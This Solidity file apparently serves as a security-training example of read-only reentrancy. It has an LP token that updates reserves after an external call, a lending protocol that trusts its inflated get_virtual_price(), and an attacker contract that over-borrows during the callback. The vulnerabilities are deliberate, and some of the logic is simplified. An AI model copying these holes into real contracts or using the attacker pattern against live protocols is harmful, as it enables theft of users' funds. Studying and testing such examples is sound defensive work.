// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReadOnlyReentrancyVuln
 * @notice EXAMPLE VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
 * @dev Demonstrates read-only reentrancy vulnerability
 *      Similar to the Curve Finance oracle manipulation attack.
 *      
 *      The issue: View functions return stale data during reentrancy,
 *      which dependent protocols use for pricing/collateral calculations.
 */

/**
 * @title VulnerableLPToken
 * @notice LP token with vulnerable pricing function
 */
contract VulnerableLPToken {
    string public name = "Vulnerable LP Token";
    string public symbol = "vLP";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    
    // Pool reserves
    uint256 public reserve0;
    uint256 public reserve1;
    
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event Sync(uint256 reserve0, uint256 reserve1);
    
    constructor() {
        // Initialize with some liquidity
        reserve0 = 1000 ether;
        reserve1 = 1000 ether;
        totalSupply = 1000 ether;
        balanceOf[msg.sender] = 1000 ether;
    }
    
    /**
     * @notice Get the price of LP token in terms of underlying
     * @dev VULNERABLE: Returns stale value during reentrancy!
     *      During remove_liquidity callback, reserves are updated
     *      but this function returns the OLD values.
     */
    function get_virtual_price() public view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        
        // Price = (reserve0 + reserve1) / totalSupply
        // During reentrancy, reserves may not reflect actual state
        return ((reserve0 + reserve1) * 1e18) / totalSupply;
    }
    
    /**
     * @notice Add liquidity to the pool
     */
    function add_liquidity(uint256 amount0, uint256 amount1) external payable returns (uint256 lpAmount) {
        require(amount0 > 0 && amount1 > 0, "Invalid amounts");
        
        if (totalSupply == 0) {
            lpAmount = sqrt(amount0 * amount1);
        } else {
            lpAmount = min(
                (amount0 * totalSupply) / reserve0,
                (amount1 * totalSupply) / reserve1
            );
        }
        
        require(lpAmount > 0, "Insufficient liquidity minted");
        
        reserve0 += amount0;
        reserve1 += amount1;
        totalSupply += lpAmount;
        balanceOf[msg.sender] += lpAmount;
        
        emit Mint(msg.sender, lpAmount);
        emit Sync(reserve0, reserve1);
        
        return lpAmount;
    }
    
    /**
     * @notice Remove liquidity from the pool
     * @dev VULNERABLE: External call BEFORE reserve updates
     */
    function remove_liquidity(uint256 lpAmount) external returns (uint256 amount0, uint256 amount1) {
        require(balanceOf[msg.sender] >= lpAmount, "Insufficient LP balance");
        require(lpAmount > 0, "Invalid amount");
        
        // Calculate amounts to return
        amount0 = (lpAmount * reserve0) / totalSupply;
        amount1 = (lpAmount * reserve1) / totalSupply;
        
        // Burn LP tokens first
        balanceOf[msg.sender] -= lpAmount;
        totalSupply -= lpAmount;
        
        // VULNERABILITY: External call BEFORE updating reserves
        // During this call, get_virtual_price() returns inflated value
        // because reserves haven't been reduced yet!
        (bool success, ) = msg.sender.call{value: amount0}("");
        require(success, "ETH transfer failed");
        
        // Reserves updated AFTER external call - TOO LATE!
        reserve0 -= amount0;
        reserve1 -= amount1;
        
        emit Burn(msg.sender, lpAmount);
        emit Sync(reserve0, reserve1);
        
        return (amount0, amount1);
    }
    
    // Helper functions
    function sqrt(uint256 x) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    receive() external payable {}
}


/**
 * @title DependentLendingProtocol
 * @notice Protocol that uses LP token price for collateral
 * @dev This protocol is vulnerable because it trusts get_virtual_price()
 */
contract DependentLendingProtocol {
    VulnerableLPToken public lpToken;
    
    mapping(address => uint256) public collateral;  // LP tokens deposited
    mapping(address => uint256) public debt;        // Amount borrowed
    
    uint256 public constant COLLATERAL_RATIO = 150; // 150% collateralization
    
    event CollateralDeposited(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);
    event Liquidated(address indexed user, address indexed liquidator);
    
    constructor(address _lpToken) {
        lpToken = VulnerableLPToken(_lpToken);
    }
    
    /**
     * @notice Deposit LP tokens as collateral
     */
    function depositCollateral(uint256 amount) external {
        require(lpToken.balanceOf(msg.sender) >= amount, "Insufficient LP balance");
        
        // Transfer LP tokens (simplified - real impl would use transferFrom)
        collateral[msg.sender] += amount;
        
        emit CollateralDeposited(msg.sender, amount);
    }
    
    /**
     * @notice Borrow against collateral
     * @dev VULNERABLE: Uses get_virtual_price() which can be manipulated
     */
    function borrow(uint256 amount) external {
        uint256 collateralValue = getCollateralValue(msg.sender);
        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;
        
        require(debt[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        
        debt[msg.sender] += amount;
        
        // Send borrowed funds
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Borrowed(msg.sender, amount);
    }
    
    /**
     * @notice Get collateral value in ETH
     * @dev Uses get_virtual_price() - vulnerable to manipulation!
     */
    function getCollateralValue(address user) public view returns (uint256) {
        uint256 lpAmount = collateral[user];
        uint256 price = lpToken.get_virtual_price();
        
        // During reentrancy attack, price is inflated
        // allowing attacker to borrow more than they should
        return (lpAmount * price) / 1e18;
    }
    
    /**
     * @notice Check if position is liquidatable
     */
    function isLiquidatable(address user) public view returns (bool) {
        if (debt[user] == 0) return false;
        
        uint256 collateralValue = getCollateralValue(user);
        uint256 requiredCollateral = (debt[user] * COLLATERAL_RATIO) / 100;
        
        return collateralValue < requiredCollateral;
    }
    
    receive() external payable {}
}


/**
 * @title ReadOnlyAttacker
 * @notice Exploits read-only reentrancy to over-borrow
 */
contract ReadOnlyAttacker {
    VulnerableLPToken public lpToken;
    DependentLendingProtocol public lendingProtocol;
    address public owner;
    
    bool public attacking;
    
    constructor(address _lpToken, address _lendingProtocol) {
        lpToken = VulnerableLPToken(_lpToken);
        lendingProtocol = DependentLendingProtocol(_lendingProtocol);
        owner = msg.sender;
    }
    
    /**
     * @notice Execute the read-only reentrancy attack
     */
    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        
        // Step 1: Add liquidity to get LP tokens
        uint256 lpAmount = lpToken.add_liquidity{value: msg.value}(msg.value, msg.value);
        
        // Step 2: Deposit LP as collateral
        lendingProtocol.depositCollateral(lpAmount);
        
        // Step 3: Start removing liquidity (triggers reentrancy)
        attacking = true;
        lpToken.remove_liquidity(lpAmount / 2);
        attacking = false;
    }
    
    /**
     * @notice Callback during remove_liquidity
     * @dev At this point, get_virtual_price() returns INFLATED value
     *      because LP tokens are burned but reserves not yet updated
     */
    receive() external payable {
        if (attacking) {
            // During callback, price is artificially high
            // We can borrow more than our collateral is actually worth!
            
            uint256 inflatedValue = lendingProtocol.getCollateralValue(address(this));
            uint256 maxBorrow = (inflatedValue * 100) / 150;
            
            // Borrow the maximum (based on inflated price)
            if (maxBorrow > 0) {
                try lendingProtocol.borrow(maxBorrow) {
                    // Successfully borrowed against inflated collateral value!
                } catch {
                    // Borrow failed
                }
            }
        }
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
